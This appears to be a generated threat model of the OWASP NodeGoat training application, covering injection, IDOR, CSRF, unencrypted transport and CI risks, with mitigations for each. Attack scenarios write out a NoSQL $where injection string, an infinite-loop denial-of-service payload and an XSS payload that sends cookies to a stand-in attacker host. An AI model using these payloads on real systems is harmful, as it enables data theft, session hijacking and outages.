components.name: End User (Browser)
components.description: A person using the RetireEasy/NodeGoat web application through a browser, logging in, editing profile data, contributions, memos and viewing allocations.

components.name: NodeGoat Express Server
components.description: Express 4 application (server.js) that serves all HTML pages and handles routing, session management via express-session, templating with swig/consolidate and markdown rendering with marked. Security middleware (helmet, csurf, dont-sniff-mimetype) is present as a dependency but commented out in server.js.

components.name: Session Handler / Login
components.description: SessionHandler implements login, signup, logout and the isLoggedInMiddleware / isAdminUserMiddleware guards based on req.session.userId. Login credentials are validated against the users collection.

components.name: Profile Handler
components.description: Handles GET/POST /profile, accepting first/last name, SSN, date of birth, address, bank account and bank routing number, validating the routing number with a regex, and persisting through ProfileDAO.

components.name: Contributions Handler
components.description: Handles GET/POST /contributions; parses preTax, afterTax and roth percentages from the request body using eval() and persists contributions through ContributionsDAO.

components.name: Allocations Handler
components.description: Handles GET /allocations/:userId, taking the user id from the URL parameter and a threshold from the query string, then querying allocations via AllocationsDAO using a MongoDB $where clause built by string interpolation.

components.name: Benefits Handler
components.description: Handles GET/POST /benefits, listing all non-admin users and updating their benefit start dates. The view is rendered with user.isAdmin hard-coded to true and the routes are mounted with only isLoggedIn, no role check.

components.name: Memos Handler
components.description: Handles GET/POST /memos, storing arbitrary memo text from the request body into the memos collection and rendering all stored memos through the marked markdown renderer in the template.
assets: stored memo content shared across all users

components.name: Research Handler
components.description: Handles GET /research; when a symbol query parameter is present it concatenates the request-supplied url and symbol parameters and issues an outbound HTTP request with needle, writing the response body straight back to the client.
assets: outbound request capability from the server's network position

components.name: Tutorial Router
components.description: Unauthenticated Express router mounted at /tutorial that renders static OWASP Top 10 tutorial pages.

components.name: Learn Redirect Endpoint
components.description: GET /learn handler that redirects the browser to the URL supplied in the url query string parameter without validation.

components.name: MongoDB
components.description: MongoDB instance holding the users, allocations, contributions and memos collections. Connection string comes from MONGODB_URI, defaulting to mongodb://localhost:27017/nodegoat; in docker-compose it is an unauthenticated mongo:4.4 service on the internal network.

components.name: Database Reset/Seed Script
components.description: artifacts/db-reset.js drops collections and inserts seeded admin and user accounts with hard-coded passwords; run at container start and on Heroku postdeploy.

components.name: External Stock Quote Site
components.description: Third-party site (default https://finance.yahoo.com/quote/) fetched server-side by the research handler; the host is taken from the request so it may be any attacker-chosen endpoint.

components.name: GitHub Actions CI
components.description: GitHub Actions workflows that lint the code and run Cypress end-to-end tests against the app with a throwaway MongoDB container.

threats.title: Server-side JavaScript injection through the threshold query parameter on GET /allocations/:userId
threats.asset: other users' asset allocation records and any other document in the nodegoat MongoDB database
threats.attackScenario: allocations-handler passes req.query.threshold straight into AllocationsDAO.getByUserIdAndThreshold (app/routes/allocations.js:19-23), which interpolates it into a $where JavaScript string at app/data/allocations-dao.js:78, so an attacker requests GET /allocations/1?threshold=1'; return 1 == '1 to break out of the quoted comparison and make the predicate always true, returning every allocation document, and can extend the payload with arbitrary JavaScript evaluated by the database engine.
threats.impactReason: The injected JavaScript is evaluated server-side by MongoDB with the application's database privileges, exposing all allocation documents and allowing arbitrary predicate logic over the collection.
threats.likelihoodReason: The parameter is supplied directly through a GET query string from the allocations.html search form and needs no special tooling; the disabled validation is visible in the commented-out code.

mitigation.summary: Remove the $where clause and filter on the numeric threshold with a normal query operator.
steps: Replace the interpolated $where at app/data/allocations-dao.js:77-79 with `{ userId: parsedUserId, stocks: { $gt: parsedThreshold } }`.
Coerce threshold with parseInt(threshold, 10) and reject values outside 0-99 before building the criteria, as the commented block at lines 70-75 shows.
Restore the numeric input constraint in app/views/allocations.html line 22 (type="number" min="0" max="99") as defence in depth.

threats.title: No audit record of allocation lookups performed against other users' ids
threats.asset: accountability for access to other users' allocation records
threats.attackScenario: GET /allocations/:userId serves any requested user id with no ownership check and the handler in app/routes/allocations.js writes nothing about who requested which id, so an attacker enumerating GET /allocations/1..N to harvest allocations and names leaves no server-side record tying the session account to the ids it read, and the operator cannot later prove which account performed the enumeration.
assumptions: No access log middleware recording the session user id alongside the requested :userId is registered in front of the allocations route.
threats.impactReason: Data is not lost directly, but cross-account reads cannot be attributed or scoped during an investigation.
threats.likelihoodReason: Any logged-in user can perform the unlogged cross-account reads described in the ownership-check finding.

mitigation.summary: Log the session user id together with the requested :userId for every allocations lookup.
steps: In app/routes/allocations.js displayAllocations, emit a structured log entry containing req.session.userId, req.params.userId and the threshold value before calling the DAO.
Record a distinct warning entry whenever req.session.userId differs from req.params.userId.

threats.title: Any authenticated user can read another user's allocations by changing the :userId path segment
threats.asset: other users' asset allocation records and their user names, first and last names
threats.attackScenario: displayAllocations at app/routes/allocations.js:16-18 takes userId from req.params instead of req.session (the session-based fix is commented out at lines 13-15) and no ownership or role check runs before the handler, so an attacker who signs up and logs in requests GET /allocations/2, GET /allocations/3 and so on to enumerate every user's stocks, funds and bonds allocations along with their names.
assumptions: User ids are small sequential integers, as suggested by the parseInt(userId) coercion in the DAO.
threats.impactReason: Every user's financial allocation record and full name can be harvested one id at a time.
threats.likelihoodReason: Any self-registered account reaches the route and the attack is a single URL edit.

mitigation.summary: Derive the user id from the session rather than the URL parameter.
steps: Replace `const { userId } = req.params;` with `const { userId } = req.session;` in app/routes/allocations.js as the commented fix indicates.
If viewing another user's allocations is a legitimate admin feature, add an explicit isAdmin check in the middleware chain registered for GET /allocations/:userId in app/routes/index.js.

threats.title: Denial of service by injecting an infinite loop into the MongoDB $where predicate
threats.asset: availability of the nodegoat MongoDB instance and the Express application
threats.attackScenario: Because threshold is interpolated unescaped into the $where string at app/data/allocations-dao.js:78, an attacker sends GET /allocations/1?threshold=0';while(true){} which makes the MongoDB JavaScript engine spin forever evaluating the predicate, and repeating the request across connections exhausts the database's evaluation threads so no other allocations, benefits or profile query completes.
assumptions: MongoDB server-side JavaScript execution is enabled (it is on by default for mongo:4.4 as deployed in docker-compose.yml) and no query execution timeout is configured.
threats.impactReason: A handful of requests can hang the shared MongoDB instance that every DAO in the application depends on, taking the whole service offline.
threats.likelihoodReason: The payload is a single GET request with no authentication-specific knowledge required beyond a session, and the exact string is even documented in the commented-out fix.

mitigation.summary: Eliminate the $where clause so no attacker-supplied JavaScript reaches the database engine, and bound query execution time.
steps: Rewrite getByUserIdAndThreshold in app/data/allocations-dao.js to use `{ stocks: { $gt: parsedThreshold } }` instead of $where.
Set maxTimeMS on the find() call so runaway queries are aborted.
Disable server-side JavaScript on the mongo service in docker-compose.yml with --noscripting.

threats.title: Injected $where predicate reads collections and fields beyond allocations over the Allocations Handler to MongoDB flow
threats.asset: allocation documents and the plaintext passwords, SSN and bank details joined from the users collection
threats.attackScenario: The allocations-query flow carries a find() whose criteria object contains a $where JavaScript string built by interpolating the raw threshold value (app/data/allocations-dao.js:77-79), so an attacker submits threshold=1'; return this.userId != -1 || '1 to turn the predicate into an unconditional match; every returned allocation is then joined to a user document by userDAO.getUserById, leaking user names for the whole user base through the allocations view.
assumptions: MongoDB has no authentication enabled and is reachable without credentials, matching the docker-compose configuration.
threats.impactReason: The tampered predicate controls what the database returns across the entire allocations collection and drives lookups into the users collection, which app/data/user-dao.js stores with the password field unhashed.
threats.likelihoodReason: The payload travels on an ordinary GET query string and the interpolation is unconditional whenever threshold is truthy. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Stop sending attacker-controlled JavaScript on the query flow to MongoDB.
steps: Build the find() criteria from typed query operators only: `{ userId: parsedUserId, stocks: { $gt: parsedThreshold } }` in app/data/allocations-dao.js.
Validate threshold as an integer in range 0-99 in app/routes/allocations.js before it reaches the DAO.
Run the application's MongoDB user with read access limited to the collections it needs so an injected predicate cannot widen its reach.

threats.title: Insecure Direct Object Reference on GET /allocations/:userId exposes any user's allocation records
threats.asset: other users' asset allocation records and names
threats.attackScenario: The allocations request flow carries a userId taken from the URL path rather than the session (app/routes/allocations.js:16-18 reads `const { userId } = req.params`), and the handler at app/routes/index.js:63 performs no ownership or role check, so any logged-in user changes /allocations/3 to /allocations/1 and the rendered allocations.html page returns another user's stocks, funds, bonds plus their first and last name from the userDAO lookup.
assumptions: User ids are small sequential integers, so neighbouring ids are trivially guessable.
threats.impactReason: Every user's allocation record and full name can be enumerated one id at a time.
threats.likelihoodReason: Any self-registered, authenticated user reaches the route by editing the URL; no tooling or special position is needed.

mitigation.summary: Derive the userId from the session instead of the path parameter and enforce an ownership check.
steps: In app/routes/allocations.js replace `const { userId } = req.params` with `const { userId } = req.session` as the commented fix at lines 13-15 indicates.
If the path parameter must stay for link compatibility, compare req.params.userId to req.session.userId in the handler and return 404 when they differ.
Update the link in app/views/layout.html:56 and the form action in app/views/allocations.html:15 to stop relying on a caller-supplied id.

threats.title: Session cookie and allocations responses travel over plaintext HTTP, allowing session hijacking of the allocations flow
threats.asset: session cookie
threats.attackScenario: server.js:145 starts the app with http.createServer and the session cookie is configured without `secure` or `httpOnly` (server.js:92-100 keeps those options commented out), so an attacker on the same Wi-Fi captures the connect.sid cookie as the browser issues GET /allocations/:userId and replays it to read the victim's allocation records and act as them.
assumptions: No TLS-terminating reverse proxy sits in front of the Express server in the deployed environment.
threats.impactReason: A captured session cookie grants full authenticated access to the victim's retirement profile, including allocations and profile fields such as SSN and bank account.
threats.likelihoodReason: Requires a network position between browser and server, but no application-level control prevents it once that position is held.

mitigation.summary: Serve the application over HTTPS and mark the session cookie secure and httpOnly.
steps: Enable the commented https.createServer block at server.js:149-155 or terminate TLS at a proxy and set `app.set('trust proxy', 1)`.
Uncomment the session cookie options at server.js:92-100 so `httpOnly: true` and `secure: true` are set, and add a maxAge.
Add HSTS (the helmet.hsts call already sketched at server.js:54) once HTTPS is in place.

threats.title: NoSQL $where injection through the threshold query parameter on the allocations request
threats.asset: the MongoDB allocations collection and the application's availability
threats.attackScenario: The threshold query parameter travelling on this flow is interpolated unescaped into a JavaScript `$where` string at app/data/allocations-dao.js:78, so an attacker submits GET /allocations/1?threshold=1'; return 1 == '1 to make the predicate always true and dump every allocation document, or submits threshold=0';while(true){}' to spin the MongoDB server thread and deny service.
assumptions: The MongoDB deployment has server-side JavaScript execution enabled, which is required for $where evaluation.
threats.impactReason: Arbitrary JavaScript evaluated server-side in the database both exposes the whole allocations collection and can hang the database with an infinite loop.
threats.likelihoodReason: The threshold field is a free-text input exposed in the allocations form (app/views/allocations.html:22) and reachable by any authenticated user via the query string.

mitigation.summary: Stop building a $where predicate from user input; validate threshold as a bounded integer and use a normal comparison query.
steps: In app/data/allocations-dao.js replace the `$where` branch at lines 77-79 with `{ userId: parsedUserId, stocks: { $gt: parsedThreshold } }` using `parseInt(threshold, 10)`.
Reject the request when the parsed threshold is NaN or outside 0-99, as the commented fix at lines 70-75 describes.
Restore the numeric input constraint in app/views/allocations.html:21 for defence in depth.

threats.title: Unauthenticated MongoDB service lets a network-adjacent process impersonate the application
threats.asset: the users, allocations, benefits and memos collections
threats.attackScenario: The connection string in docker-compose.yml:8 is `mongodb://mongo:27017/nodegoat` with no username or password and the mongo:4.4 service declares no auth configuration, so any process that can reach port 27017 on the compose network opens its own client, impersonates the NodeGoat server, and sets `isAdmin: true` on its own user document in the users collection that benefits-dao.js filters on.
assumptions: An attacker can reach the mongo service port from another container, a sidecar, or a host with the port mapped.
MongoDB has no authentication enabled and is reachable without credentials, matching the docker-compose configuration.
The mongo service runs without --auth, so no credential is required by the server side of this flow.
threats.impactReason: Direct write access to the users collection grants admin privilege escalation and full read of SSN, bank and plaintext password fields.
threats.likelihoodReason: No credential is needed once the attacker reaches the database port, though that requires a network foothold. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Require authentication and network isolation on the MongoDB instance.
steps: Run the mongo service in docker-compose.yml with --auth and create a least-privilege application user limited to the nodegoat database.
Put the credentials into MONGODB_URI via an environment secret rather than the literal URI in docker-compose.yml:8.
Bind mongo to the internal compose network only and never publish 27017 to the host.

threats.title: MongoDB connection from the Express server carries plaintext credentials and user data with no TLS
threats.asset: plaintext user passwords, SSN and bank details in transit
threats.attackScenario: MongoClient.connect at server.js:30 uses the MONGODB_URI value, which docker-compose.yml:8 sets to `mongodb://mongo:27017/nodegoat` with no ssl/tls option and no credentials, so an attacker with a foothold on the container network sniffs the wire-protocol traffic on port 27017 and reads the plaintext password field written by user-dao.js addUser plus the SSN and bank fields written by profile-dao.js updateUser.
assumptions: The container network between the web and mongo services is observable to an attacker who has compromised any co-located container or host.
The deployment uses the docker-compose MONGODB_URI value or an equivalent URI without tls=true.
threats.impactReason: Passwords are stored as received from the request (user-dao.js:25) so sniffed traffic yields directly reusable credentials along with SSN and bank routing numbers.
threats.likelihoodReason: Requires network position inside the deployment, but no authentication or encryption stands in the way once that position is held.

mitigation.summary: Enable TLS and authentication on the MongoDB connection.
steps: Append `?tls=true&authSource=admin` and credentials to MONGODB_URI in docker-compose.yml:8 and configure mongo:4.4 with a keyfile and certificate.
Pass explicit tls options to MongoClient.connect in server.js:30 and fail startup if the URI is not a TLS URI.
Restore the bcrypt hashing at app/data/user-dao.js:29 so intercepted traffic never exposes cleartext passwords.

threats.title: Loss of the MongoDB connection terminates the Express process and takes the site down
threats.asset: availability of the NodeGoat application
threats.attackScenario: server.js:30-35 calls process.exit(1) if MongoClient.connect fails and the entire route setup lives inside that callback, so an attacker who can exhaust MongoDB's connection slots or briefly disrupt the mongo service on the compose network causes the web container to exit with every route unregistered, and forever restarts into the same failure loop while /dashboard stays unreachable.
assumptions: The web container has no readiness-independent retry beyond the docker-compose start loop and forever restart.
threats.impactReason: Every route including the login page becomes unavailable because the app is only assembled after a successful connect.
threats.likelihoodReason: Requires the ability to disrupt the database or its network path, which is not reachable from the public internet in the compose layout.

mitigation.summary: Handle database connection loss without killing the process.
steps: Replace process.exit(1) at server.js:34 with a retry/backoff reconnect using the mongodb driver's reconnect options.
Register routes and a health endpoint before the connect callback so the server can serve a degraded response while the database is unavailable.

threats.title: Credentials travel to MongoDB in cleartext over an unauthenticated, unencrypted wire connection
threats.asset: plaintext user passwords, SSN and bank details in the users collection
threats.attackScenario: validateLogin at app/data/user-dao.js:57-93 issues usersCol.findOne and compares the returned password with `===` at line 61, and the connection string in docker-compose.yml:8 / config/env/all.js:3 is `mongodb://mongo:27017/nodegoat` with no credentials and no tls option, so anyone on the container network sniffs the MongoDB wire traffic on the auth-validate-user flow and reads the returned user document — plaintext password, ssn, bankAcc and bankRouting — or connects directly to mongo:27017 and rewrites a user's isAdmin flag.
assumptions: MongoDB has no authentication enabled and is reachable without credentials, matching the docker-compose configuration.
The MongoDB URI shown in docker-compose.yml and config/env/all.js is the one used in the deployed environment, so the connection carries no credentials and no TLS.
threats.impactReason: The flow carries cleartext passwords plus SSN and bank details for every user, and unauthenticated write access allows privilege escalation via isAdmin.
threats.likelihoodReason: Exploitation needs a foothold on the container or host network rather than remote unauthenticated access. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Require authentication and TLS on the MongoDB connection used by the DAOs.
steps: Create a least-privilege Mongo user and put its credentials plus ?tls=true in MONGODB_URI in docker-compose.yml:8 instead of the anonymous URI.
Start the mongo service with --auth and --tlsMode requireTLS in docker-compose.yml:13-17.
Remove the hardcoded fallback URI default in config/env/all.js:3 so the app fails closed when MONGODB_URI is unset.

threats.title: Unbounded users scan on every benefits request can exhaust the database connection
threats.asset: availability of the benefits page and the shared MongoDB connection
threats.attackScenario: getAllNonAdminUsers in app/data/benefits-dao.js:15 issues an unfiltered find({isAdmin: {$ne: true}}).toArray() with no limit or pagination and updateBenefits re-runs it after every write, so a logged-in attacker loops POST /benefits at app/routes/index.js:56 to force repeated full-collection scans and materialisation into memory, starving the single shared Mongo connection and the Node process.
assumptions: No rate limiting is applied in front of the /benefits routes.
The users collection is large enough that a full scan is non-trivial in the deployed environment.
threats.impactReason: Sustained full-collection scans degrade or stall the single-process Express app and the shared Mongo connection for all users.
threats.likelihoodReason: Only an authenticated session and a scripted POST loop are required.

mitigation.summary: Paginate the user listing and rate-limit the benefits routes.
steps: Add .limit() and skip-based paging to the find in app/data/benefits-dao.js:15 and project only the fields the view needs.
Apply a per-session request limiter to the /benefits routes registered in app/routes/index.js:55-56.

threats.title: Reflected/stored script execution through benefit fields rendered by the benefits view
threats.asset: admin session cookie and the benefits administration page
threats.attackScenario: app/views/benefits.html:51-57 prints {{user.firstName}} and the benefitStartDate input value directly, while the swig engine is configured with autoescape: false in server.js:135-142, so an attacker sets their profile first name (or posts an unvalidated benefitStartDate) to <script>fetch('//attacker/?c='+document.cookie)</script> and the payload executes in the browser of whoever opens /benefits.
assumptions: The benefits view is rendered by the swig engine configured in server.js with autoescape disabled.
User-controlled profile fields such as firstName are persisted without HTML sanitisation.
threats.impactReason: Script runs in the context of a user viewing the benefits admin page whose session cookie lacks httpOnly, allowing session theft and benefit tampering on their behalf.
threats.likelihoodReason: Requires an attacker-controlled field to be persisted and an admin to visit /benefits, but no privileged position is needed to plant the payload.

mitigation.summary: Enable template auto-escaping and validate the benefit date input.
steps: Set autoescape: true in the swig.setDefaults call in server.js:135 so app/views/benefits.html escapes user fields.
Validate benefitStartDate against an ISO-8601 date regex in app/routes/benefits.js:29 before persisting it.

threats.title: Unauthorised modification of any employee's benefit start date via POST /benefits
threats.asset: benefit start dates in the users collection
threats.attackScenario: POST /benefits at app/routes/index.js:56 reaches updateBenefits in app/routes/benefits.js:29, which takes userId and benefitStartDate straight from req.body and calls usersCol.update({_id: parseInt(userId)}, {$set: {benefitStartDate}}) in app/data/benefits-dao.js:23 without verifying the caller is an admin or owns the record, so any logged-in employee posts userId=1&benefitStartDate=1970-01-01 and rewrites another employee's benefit start date.
assumptions: CSRF protection is disabled on these state-changing routes, so cross-site request forgery is possible.
No admin or ownership check exists in middleware upstream of the POST /benefits handler.
threats.impactReason: Benefit eligibility data for any employee id can be silently altered, affecting payroll/benefit entitlement integrity.
threats.likelihoodReason: A single authenticated form POST with an arbitrary numeric userId; ids are sequential integers produced by getNextSequence. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Authorise the benefits update and validate its inputs server-side.
steps: Apply an admin-role middleware to POST /benefits in app/routes/index.js:56 before updateBenefits runs.
In app/routes/benefits.js:29 validate that benefitStartDate matches an ISO date and that parseInt(userId) yields a number, rejecting anything else before calling the DAO.
Restrict the update in app/data/benefits-dao.js:23 to non-admin users by adding an isAdmin: {$ne: true} clause to the update filter.

threats.title: Benefit updates leave no attributable audit record
threats.asset: audit trail for benefit start date changes
threats.attackScenario: updateBenefits in app/data/benefits-dao.js:31-34 logs only the string "Updated benefits" with no actor, target userId or old/new value, so an insider changes a colleague's benefitStartDate through POST /benefits and later denies it because nothing ties the change to their session.
assumptions: No separate audit or access log records the acting session user for benefit mutations.
Security-relevant events are only sent to console.error and are not captured in any durable audit log.
threats.impactReason: Fraudulent benefit changes cannot be attributed or reconstructed during an investigation.
threats.likelihoodReason: Any authenticated user reaching the route produces an unattributed change as a side effect of normal use. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Write an attributable audit entry for every benefits mutation.
steps: In app/routes/benefits.js:29 capture req.session.userId and log/persist actor, target userId, previous and new benefitStartDate.
Replace the bare console.log in app/data/benefits-dao.js:33 with a structured log line including the target _id and the new value.

threats.title: Any logged-in employee can read every employee record via GET /benefits
threats.asset: all non-admin employee records (employee ids, names, benefit start dates)
threats.attackScenario: GET /benefits at app/routes/index.js:55 is mounted with only isLoggedIn and displayBenefits in app/routes/benefits.js:13 calls benefitsDAO.getAllNonAdminUsers() with no role check, so an ordinary employee signs in, browses to /benefits, and receives the full list of every non-admin user rendered into app/views/benefits.html.
assumptions: No admin role check is applied in middleware upstream of the /benefits route registration.
threats.impactReason: The entire non-admin user collection is disclosed to any authenticated account, including employee identifiers used as keys elsewhere in the app.
threats.likelihoodReason: Reachable by any self-registered, logged-in user with a single GET request; no special position needed.

mitigation.summary: Enforce an administrator role check on the benefits routes.
steps: Add an isAdmin middleware that reads the session user's role from the database and rejects non-admins, and apply it to both /benefits routes in app/routes/index.js:55-56.
Stop hard-coding user: { isAdmin: true } in app/routes/benefits.js:19-25 and :44-46; pass the real session user so the view reflects actual privilege.

threats.title: Any logged-in employee can rewrite any employee's benefit start date through POST /benefits
threats.asset: all employee records' benefitStartDate fields
threats.attackScenario: A non-admin user who knows the /benefits endpoint exists posts userId=<other employee's numeric id>&benefitStartDate=2030-01-01 to POST /benefits; app/routes/benefits.js:29-35 takes userId straight from req.body and benefits-dao.js:23 updates users._id = parseInt(userId) without checking that the caller is an admin or owns the record, so the attacker rewrites another employee's benefit start date.
assumptions: No admin-only authorisation middleware is applied to the POST /benefits route upstream of BenefitsHandler.updateBenefits.
User _id values are small sequential integers and therefore guessable.
threats.impactReason: Benefit start dates for the whole employee population can be altered one id at a time, affecting payroll/benefits eligibility.
threats.likelihoodReason: Any authenticated employee can craft the form post; the handler hardcodes user.isAdmin = true in its own render context rather than checking the session.

mitigation.summary: Enforce an admin role check on the benefits update route and stop trusting the body-supplied userId blindly.
steps: Add an isAdmin session check middleware to the POST /benefits route registration in app/routes/index.js:56 that rejects non-admin sessions with 403.
Stop rendering user: { isAdmin: true } unconditionally in app/routes/benefits.js and use the session user instead.
Validate that userId is an integer matching an existing non-admin user before calling benefitsDAO.updateBenefits.

threats.title: Cross-site request forgery on POST /benefits changes employee benefit start dates
threats.asset: employee benefitStartDate records
threats.attackScenario: An attacker emails an administrator a page that auto-submits a hidden form to /benefits with userId and benefitStartDate fields (the same fields the form in app/views/benefits.html:54-57 posts); the admin's session cookie rides along and benefits-dao.js writes the attacker's date into the targeted user document, with no token in the request for the server to verify.
assumptions: CSRF protection is disabled on these state-changing routes, so cross-site request forgery is possible.
No CSRF token is generated or verified for the /benefits form post, so the session cookie alone authorises the write.
Security-relevant events are only sent to console.error and are not captured in any durable audit log.
The session cookie is sent on cross-site form submissions.
threats.impactReason: Benefit start dates for arbitrary employees can be silently modified using an administrator's authority.
threats.likelihoodReason: Only requires a privileged user to open an attacker-supplied link while logged in. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies; no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Verify an anti-CSRF token on the benefits update post.
steps: Re-enable csurf and the res.locals.csrftoken helper in server.js.
Add a hidden _csrf input to the form in app/views/benefits.html.
Set SameSite=Lax on the session cookie in the express-session configuration.

threats.title: Benefits update request and session cookie exposed in cleartext HTTP
threats.asset: session cookie of the benefits administrator and employee identifiers submitted with the update
threats.attackScenario: An attacker sniffing the network path reads the POST /benefits request, which server.js:145 serves over plain http, harvesting the administrator's session cookie and the userId values of employees, then replays the cookie to call POST /benefits himself.
assumptions: The deployment exposes the http listener from server.js directly rather than terminating TLS in front of it.
The session cookie lacks the secure attribute, as the secure cookie option in server.js is commented out.
threats.impactReason: A captured administrator session cookie grants write access to every employee's benefits record.
threats.likelihoodReason: Passive interception needs a network position but no application-level access.

mitigation.summary: Terminate the application on HTTPS and mark session cookies secure.
steps: Switch server.js from http.createServer to the commented https.createServer block with real certificates.
Enable cookie: { secure: true, httpOnly: true } in the express-session options in server.js.
Enable helmet.hsts() so browsers do not downgrade to http.

threats.title: CI drives the app over plaintext HTTP on a shared runner, exposing session cookies in transit
threats.asset: user session state and the session cookie issued to the Cypress client
threats.attackScenario: The `Run E2E test suite` step in .github/workflows/e2e-test.yml starts the server with `NODE_ENV=test npm start` and Cypress talks to it over HTTP (server.js only builds an `http` server, with the https bootstrap commented out at lines 18-28), so any other process co-resident on the ubuntu-latest runner or in the same docker network can read or replay the login POST and the express-session cookie carried on the ci-runs-app flow.
assumptions: No additional process isolation separates the Cypress run from other workloads on the runner.
The application under test listens on plain HTTP during the CI run, matching the commented-out HTTPS setup in server.js.
threats.impactReason: Only throwaway test sessions against a disposable MongoDB are exposed, but the same plaintext configuration is what ships in Procfile/Dockerfile for real deployment.
threats.likelihoodReason: The flow is plaintext by construction, yet an attacker needs code execution on the same ephemeral runner to observe it.

mitigation.summary: Terminate the CI-to-app flow over TLS and keep the loopback binding tight.
steps: Re-enable the HTTPS bootstrap in server.js (lines 18-28) behind a config flag and use it for the test run started in the `Run E2E test suite` step.
Bind the test server to 127.0.0.1 only so the ci-runs-app flow never leaves the runner's loopback interface.
Set `cookie: { secure: true, httpOnly: true }` on the express-session options in server.js once TLS is in place.

threats.title: Pull-request triggered E2E workflow executes untrusted branch code on the CI runner
threats.asset: build artifacts and the CI runner environment
threats.attackScenario: The E2E workflow in .github/workflows/e2e-test.yml triggers on `pull_request` and runs `npm ci`, `npm run cy:verify` and `npm start` from the checked-out tree, so an outside contributor opens a pull request that edits package.json scripts (for example the `start` or `cy:verify` script) or adds a postinstall hook, and their code executes on the ubuntu-latest runner where it can tamper with the Cypress artifacts uploaded by the `Upload cypress artifacts` step.
assumptions: The repository does not require manual approval before running workflows for pull requests from forks.
threats.impactReason: Arbitrary code runs in the CI job and can poison the uploaded cypress artifacts, though `persist-credentials: false` limits direct git token reuse.
threats.likelihoodReason: Anyone can open a pull request against a public repository and the workflow runs build scripts from the PR branch automatically.

mitigation.summary: Restrict which pull requests may run the E2E job and avoid executing untrusted package scripts.
steps: Gate the `e2e-test` job in .github/workflows/e2e-test.yml on `github.event.pull_request.head.repo.full_name == github.repository`, or require the `pull_request_target`-free approval setting for first-time contributors.
Run install with `npm ci --ignore-scripts` in the Install dependencies step so lifecycle hooks from a PR branch do not execute.
Give the job an explicit minimal `permissions:` block (e.g. `contents: read`).

threats.title: Unvalidated redirect on GET /learn turns the CI-exercised app into an open redirector
threats.asset: user session state of authenticated NodeGoat users
threats.attackScenario: GET /learn at app/routes/index.js:70 passes `req.query.url` straight into `res.redirect` with no allow-list or scheme validation, so an attacker sends a logged-in user a link such as /learn?url=https://attacker.example/login that the server bounces to a credential-harvesting clone; the same unvalidated parameter is reachable over the ci-runs-app flow during test runs.
assumptions: No redirect allow-list is applied in middleware ahead of the /learn handler.
threats.impactReason: Redirects to attacker-controlled hosts enable phishing that captures NodeGoat credentials and session cookies.
threats.likelihoodReason: The parameter is fully attacker-controlled and the only prerequisite is a logged-in victim clicking a link.

mitigation.summary: Validate the redirect target against an allow-list before calling res.redirect.
steps: In app/routes/index.js:70 parse `req.query.url` and reject any value that is not a relative path or is not in a hardcoded list of permitted learning-resource hosts.
Return 400 for rejected values rather than silently redirecting to a default.

threats.title: Cypress traffic can reach /allocations/:userId for any user id because the route has no ownership check
threats.asset: other users' allocation records rendered by GET /allocations/:userId
threats.attackScenario: GET /allocations/:userId at app/routes/index.js:63 is guarded only by `isLoggedIn`, so any client on the ci-runs-app flow that holds a session cookie - including a tampered Cypress spec or anyone able to reach the port 4000 the test server exposes - substitutes a different userId in the path and receives another user's allocations in the response and in the recorded test video.
assumptions: No ownership check is applied in middleware upstream of app/routes/index.js:63.
The disposable test database is seeded with more than one user account.
threats.impactReason: Every seeded user's allocation records are readable one id at a time and are then persisted into uploaded CI artifacts.
threats.likelihoodReason: Only a logged-in session is needed and the id is a path parameter that is trivial to enumerate.

mitigation.summary: Scope the allocations lookup to the session's own user id.
steps: In app/routes/index.js:63 compare `req.params.userId` with the session user id and return 404 when they differ, or drop the parameter and read the id from the session inside allocationsHandler.displayAllocations.
Add an `isAdmin`-style middleware for the cases where staff genuinely need to view another user's allocations.

threats.title: Cypress video and screenshot artifacts from CI may expose test account credentials and session cookies
threats.asset: test videos and screenshots containing rendered application data
threats.attackScenario: The E2E workflow runs Cypress with `--config video=true` and uploads the resulting recordings from test/e2e/videos and test/e2e/screenshots via actions/upload-artifact, so anyone who can view the workflow run downloads `cypress-artifacts-node*` and reads the recorded login forms and rendered pages of the NodeGoat app (memos, allocations, profile) that the tests drove.
assumptions: Cypress recordings capture the login form and authenticated pages of the app under test.
Workflow run artifacts are downloadable by anyone who can view the repository's Actions tab.
threats.impactReason: Only disposable test-database data and seeded test credentials are exposed, but those credentials are often reused in other environments.
threats.likelihoodReason: Artifacts are uploaded on every failing run and require no special access beyond viewing the repository.

mitigation.summary: Limit what is recorded and how long CI artifacts are retained.
steps: Set a short `retention-days` on the `Upload cypress artifacts` step in .github/workflows/e2e-test.yml.
Keep `"video": false` in cypress.json as the default and drop the `--config video=true` override in the `Run E2E test suite` step, enabling video only on demand.
Ensure seeded test users in the e2e fixtures never share passwords with any deployed environment.

threats.title: A hung or crashed test server blocks the E2E job because the CI start step has no readiness or timeout guard
threats.asset: the E2E test pipeline and its build artifacts
threats.attackScenario: The `Run E2E test suite` step backgrounds `NODE_ENV=test npm start -- --silent &` with no health-check wait (unlike the MongoDB step, which uses `timeout 60s ... nc -z`), so a contributor whose pull request makes server.js block on MongoClient.connect or listen slowly causes Cypress on the ci-runs-app flow to hammer a dead port and the job to occupy a runner until the default six-hour GitHub Actions limit.
assumptions: The job inherits the default GitHub Actions workflow timeout rather than an explicit shorter one.
threats.impactReason: Runner minutes are consumed and E2E feedback is lost, but no production system or user data is affected.
threats.likelihoodReason: Any pushed branch that breaks server startup triggers the condition, and the matrix runs it three times per push.

mitigation.summary: Add a readiness probe and an explicit job timeout around the app start.
steps: Mirror the MongoDB readiness loop for the app: after `NODE_ENV=test npm start -- --silent &`, add `timeout 60s bash -c 'until nc -z -w 2 localhost 4000; do sleep 2; done'` in .github/workflows/e2e-test.yml.
Set `timeout-minutes` on the `e2e-test` job so a stuck run is cancelled quickly.

threats.title: Contribution updates are accepted without CSRF protection or origin checks
threats.asset: the victim's retirement contribution percentages
threats.attackScenario: POST /contributions (app/routes/index.js:52) authorises purely on the express session cookie, so an attacker hosts a page with a hidden form auto-submitting preTax/afterTax/roth to http://host:4000/contributions; a logged-in victim visiting it has their contribution percentages silently rewritten, and the same forged request reaches the eval() sink at app/routes/contributions.js:32.
assumptions: CSRF protection is disabled on these state-changing routes, so cross-site request forgery is possible.
